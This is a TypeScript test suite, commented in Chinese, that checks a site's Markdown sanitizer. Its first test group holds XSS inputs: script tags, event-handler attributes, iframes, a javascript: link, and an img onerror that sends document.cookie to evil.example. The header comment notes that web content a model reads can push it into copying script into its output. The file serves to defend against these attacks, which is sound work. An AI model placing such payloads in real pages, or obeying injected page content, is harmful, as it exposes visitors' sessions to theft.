/**
 * Markdown 消毒的测试。
 *
 * ## 为什么这条测试存在
 *
 * 【2026-09-18 实测】这个站的 Markdown **会执行裸 HTML** —— `remarkRehype
 * ({allowDangerousHtml:true})` / `rehypeRaw()` / `rehypeStringify
 * ({allowDangerousHtml:true})` 三处在 `@astrojs/markdown-remark` 里都是无条件的，
 * 没有配置开关。而正文是从模型的聊天框里粘进来的，模型可以被它读到的网页内容
 * 诱导着把一段 `<script>` 原样抄进输出。
 *
 * ## ★ 这个文件里两组用例，第二组比第一组更容易出事
 *
 * 第一组「必须被中和」是显而易见的那一半。
 * **第二组「必须活下来」才是真正的雷区** —— 消毒是个白名单，写窄一格就会
 * 悄悄吃掉代码高亮的颜色、表格的结构、或者图片的 `src`。而那种失败
 * **不报错、构建全绿**，只是页面上少了点东西，可能几周都没人发现。
 *
 * 尤其 `<img>`：教程模块整个靠它，而截图的 `src` 是**相对路径**
 * （`../../assets/guides/…`），要是被协议白名单拦掉，图会全部消失。
 *
 * ## 用的是和构建**同一份** schema
 *
 * `src/config/sanitize.ts` 那一份，`astro.config.ts` import 的也是它。
 * 各写一份就是"测的和跑的不是同一个东西"，那正是 docs/gate.md 第 7 节
 * 那个 SC 13D 事故的形态。
 *
 * ⚠ 插件顺序也是这条测试在守的东西。schema 里敢放开 `style` / `className`，
 *   前提是消毒跑在 `rehypeRaw` **之前**（那时裸 HTML 还是会被整个丢掉的
 *   `raw` 节点）。哪天上游把 `rehypeRaw` 挪到用户插件前面，
 *   第一组用例会立刻红。
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { createMarkdownProcessor } from "@astrojs/markdown-remark";
import rehypeSanitize from "rehype-sanitize";
import rehypeCallouts from "rehype-callouts";
import {
  transformerNotationDiff,
  transformerNotationHighlight,
  transformerNotationWordHighlight,
} from "@shikijs/transformers";
import { MARKDOWN_SANITIZE_SCHEMA } from "../../src/config/sanitize";

/**
 * 和 `astro.config.ts` 里那套**尽量一致**的 processor。
 *
 * ⚠ 有一处刻意不同：这里没挂 `transformerFileName`（它 import 了
 *   `src/utils/transformers/fileName`，而那个文件 import 了 astro 的东西，
 *   裸 tsx 下拉不动）。它只往 `<pre>` 上加一个 data 属性和一个文件名节点，
 *   覆盖它的是下面 `data*` 那条用例。
 */
const processor = await createMarkdownProcessor({
  smartypants: false,
  rehypePlugins: [[rehypeSanitize, MARKDOWN_SANITIZE_SCHEMA], rehypeCallouts],
  shikiConfig: {
    themes: { light: "min-light", dark: "night-owl" },
    defaultColor: false,
    wrap: false,
    transformers: [
      transformerNotationHighlight(),
      transformerNotationWordHighlight(),
      transformerNotationDiff({ matchAlgorithm: "v3" }),
    ],
  },
});

const render = async (md: string) => (await processor.render(md)).code;

// ── 第一组：必须被中和 ──────────────────────────────────────────────────
//
// 每条都是「模型真的可能吐出来」的形态，不是从消毒库文档里抄的样例。
// 判据一律是**渲染结果里不许出现那个危险片段**，不是"看起来不一样就行"。

const MUST_NEUTRALIZE: [string, string, RegExp][] = [
  [
    "裸 script",
    "这家公司的护城河在于渠道。\n\n<script>alert(1)</script>\n",
    /<script/i,
  ],
  [
    "img 的 onerror",
    '下面是财报截图：\n\n<img src="x" onerror="fetch(\'//evil.example?c=\'+document.cookie)">\n',
    /onerror/i,
  ],
  [
    "a 的 onclick",
    '详见 <a href="#" onclick="alert(1)">这份公告</a>。',
    /onclick/i,
  ],
  ["iframe", '<iframe src="https://evil.example/x"></iframe>', /<iframe/i],
  ["object", '<object data="evil.swf"></object>', /<object/i],
  ["embed", '<embed src="evil.swf">', /<embed/i],
  [
    "svg 的 onload",
    "<svg onload=alert(1)><circle r=1/></svg>",
    /onload|<svg/i,
  ],
  ["style 块", "<style>body{display:none}</style>", /<style/i],
  ["form + input", '<form action="//evil.example"><input name="pw"></form>', /<form/i],
  [
    // ★ 这一条**不经过裸 HTML** —— 它是合法的 Markdown 链接语法。
    //   只丢 raw 节点是挡不住的，靠的是 schema 的协议白名单。
    "Markdown 链接里的 javascript: 协议",
    "[点我看详情](javascript:alert(document.domain))",
    /javascript:/i,
  ],
  [
    // ⚠ 这一条的判据是 `<img`（**未转义的标签开头**），不是字面量 `ONERROR`。
    //   实测消毒后的输出是 `<p>&#x3C;IMG\nSRC="x"\nONERROR="alert(1)"</p>` ——
    //   `<` 被转义成 `&#x3C;`，整段变成**死文本**，浏览器不会当标签解析。
    //   拿 `/ONERROR/` 去断言会误判成"没挡住"，而那恰恰是挡住了的样子。
    //   所有裸 HTML 的用例都该这么判：看有没有真的标签，不看有没有那串字。
    "大写 + 属性跨行的 img",
    '<IMG\n  SRC="x"\n  ONERROR="alert(1)"\n>',
    /<img/i,
  ],
];

for (const [name, md, forbidden] of MUST_NEUTRALIZE) {
  test(`必须中和：${name}`, async () => {
    const html = await render(md);
    assert.ok(
      !forbidden.test(html),
      `危险片段还在输出里。\n  输入：${md}\n  输出：${html}`
    );
  });
}

// ── 第二组：必须活下来（**更容易出事的一半**）────────────────────────────

test("代码高亮：颜色、行、语言标记都要在", async () => {
  const html = await render("```ts\nconst x: number = 1;\n```");
  assert.match(html, /astro-code/, "shiki 的容器 class 没了");
  assert.match(html, /<pre[^>]*>/, "<pre> 没了");
  // ⚠ 判据是 `--shiki-light`，不是 `color:`。站里 `defaultColor: false`，
  //   shiki 输出的是 **CSS 变量**（`--shiki-light:#D32F2F;--shiki-dark:#C792EA`），
  //   由 typography.css 里的深浅色规则去选用哪一个 —— 输出里根本没有 `color:` 这个词。
  assert.match(
    html,
    /style="[^"]*--shiki-light/,
    "内联颜色没了 —— 高亮变成纯文本"
  );
  assert.match(html, /class="line"/, "行 class 没了");
  assert.match(html, /data-language="ts"/, "data-language 没了（data* 没放行）");
});

test("代码高亮的 transformer：diff 的行状态要在", async () => {
  const html = await render(
    "```ts\nconst a = 1; // [!code ++]\nconst b = 2; // [!code --]\n```"
  );
  assert.match(html, /diff/, "diff 标记没了");
  assert.match(html, /\badd\b/, "新增行的 class 没了");
  assert.match(html, /\bremove\b/, "删除行的 class 没了");
});

test("<pre> 的 tabindex 要在（代码块要能被键盘聚焦滚动）", async () => {
  const html = await render("```js\nconsole.log(1);\n```");
  assert.match(html, /tabindex="0"/i, "tabindex 被消毒吃掉了");
});

test("★ 图片：相对路径的 src 和 alt 都必须活下来", async () => {
  // 教程模块整个靠这一条。后台粘贴的截图落成 `../../assets/guides/<slug>/x.png`，
  // 是**相对路径**——协议白名单如果把没有协议的 URL 也拦掉，图会全部消失。
  const html = await render(
    "![开户向导第三步](../../assets/guides/ibkr-open/shot.png)"
  );
  assert.match(html, /<img/, "<img> 整个没了");
  assert.match(
    html,
    /src="\.\.\/\.\.\/assets\/guides\/ibkr-open\/shot\.png"/,
    "相对路径的 src 被拦掉了 —— 教程里的截图会全部消失"
  );
  assert.match(html, /alt="开户向导第三步"/, "alt 没了");
});

test("GFM 表格：结构和对齐都要在", async () => {
  const html = await render(
    "| 指标 | 本季 |\n| --- | ---: |\n| 营收 | 1.2 |\n"
  );
  assert.match(html, /<table>/, "表格没了");
  assert.match(html, /<thead>/, "表头没了");
  assert.match(html, /<td[^>]*>1\.2<\/td>/, "单元格没了");
  assert.match(html, /align="right"|text-align:\s*right/, "右对齐没了");
});

test("普通 Markdown 结构：标题、强调、列表、引用、行内代码、链接", async () => {
  const html = await render(
    "## 小标题\n\n**粗** 和 *斜*，`行内代码`。\n\n- 一\n- 二\n\n> 引用\n\n[外链](https://example.com)"
  );
  for (const [re, what] of [
    [/<h2[^>]*>小标题<\/h2>/, "h2"],
    [/<strong>粗<\/strong>/, "strong"],
    [/<em>斜<\/em>/, "em"],
    [/<code>行内代码<\/code>/, "行内 code"],
    [/<ul>/, "ul"],
    [/<blockquote>/, "blockquote"],
    [/<a href="https:\/\/example\.com"/, "外链"],
  ] as [RegExp, string][]) {
    assert.match(html, re, `${what} 被消毒吃掉了`);
  }
});

test("callout（admonition）要在 —— 它排在消毒之后，不该受影响", async () => {
  const html = await render("> [!NOTE]\n> 这是一条提示。");
  assert.match(html, /callout/, "callout 结构没了");
});

test("站上真实内容能原样渲染（回归用）", async () => {
  // 教程里那段演示图片语法的围栏代码块 —— 它同时踩到"代码块"和"图片语法"两件事。
  const html = await render(
    "写图文教程时插图直接粘贴，落下来是这样：\n\n```markdown\n![开户第三步](./shot.png)\n```\n"
  );
  assert.match(html, /astro-code/, "代码块没了");
  assert.ok(!/<img/.test(html), "代码块里的图片语法不该变成真的 <img>");
});

// ── 第三组：schema 自身的约束 ──────────────────────────────────────────

test("schema 和构建用的是同一份对象", async () => {
  // 这条不验行为，验的是"没有人偷偷在测试里另造一份宽松的 schema"。
  assert.ok(
    Array.isArray(MARKDOWN_SANITIZE_SCHEMA.attributes?.["*"]),
    "schema 形状变了"
  );
  assert.ok(
    MARKDOWN_SANITIZE_SCHEMA.attributes?.["*"]?.includes("data*"),
    "data* 没放行 —— shiki 的 transformer 会失效"
  );
  assert.ok(
    MARKDOWN_SANITIZE_SCHEMA.protocols?.href?.length,
    "协议白名单没了 —— javascript: 链接会通过"
  );
});
